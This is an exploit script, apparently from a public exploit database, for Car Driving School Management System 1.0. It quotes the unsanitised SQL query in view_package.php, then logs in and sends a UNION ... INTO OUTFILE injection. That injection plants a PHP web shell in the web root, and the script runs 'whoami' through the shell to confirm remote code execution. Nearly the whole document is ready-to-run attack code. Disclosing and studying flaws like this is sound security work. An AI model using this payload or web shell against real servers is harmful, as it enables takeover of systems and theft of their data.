# Exploit Title: SQL Injection on view_package.php leading to RCE
# Date: 8/12/2021
# Exploit Author: evdaez
# Vendor Homepage: https://www.sourcecodester.com/php/15070/car-driving-school-management-system-phpoop-free-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/cdsms_1.zip
# Version: 1.0
# Tested on: XAMPP Windows 10

'''
Vulnerable code: admin -> packages -> view_package.php
    if(isset($_GET['id'])){
        $qry = $conn->query("SELECT * FROM `package_list` where id = '{$_GET['id']}'");
'''

import requests
import binascii
from os import system, urandom

def clear_screen():
    system("cls")

def login(ip, proxies, username, password):
    sess = requests.session()
    loginURL = f"http://{ip}/cdsms/classes/Login.php?f=login"

    data = {
        "username": username,
        "password": password
    }

    req = sess.post(loginURL, data=data, proxies=proxies, verify=False)

    if "success" in req.text:
        print(f"[+] Login as {username} sucessful!")
        print(f"[+] Cookie: PHPSESSID={sess.cookies['PHPSESSID']}")
        return sess
    else:
        print("[-] Login failed!")
        raise SystemExit

def exploit(ip, proxies, sess):
    viewPackageURL = f"http://{ip}/cdsms/admin/packages/view_package.php?id="
    randomFilename = f"{binascii.hexlify(urandom(16)).decode()}.php"
    payload = f"0\'+union+select+null,\'<%3fphp+system($_GET[\"c\"])%3b%3f>\',null,null,null,null,null+into+outfile+\"C://xampp//htdocs//cdsms//{randomFilename}\"--+-'"
    sqli = viewPackageURL + payload
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}

    sess.get(sqli, headers=headers, proxies=proxies, verify=False)

    webShell = f"http://{ip}/cdsms/{randomFilename}?c=whoami"
    req = sess.get(webShell)

    print(f"[+] Trying for RCE: {webShell}")
    print("[+] Results: ")
    print(req.text.replace("\\N", "").strip())

if __name__ == "__main__":
    proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}
    ip = '127.0.0.1'
    username = 'user'
    password = 'user123'

    clear_screen()
    sess = login(ip, proxies, username, password)
    exploit(ip, proxies, sess)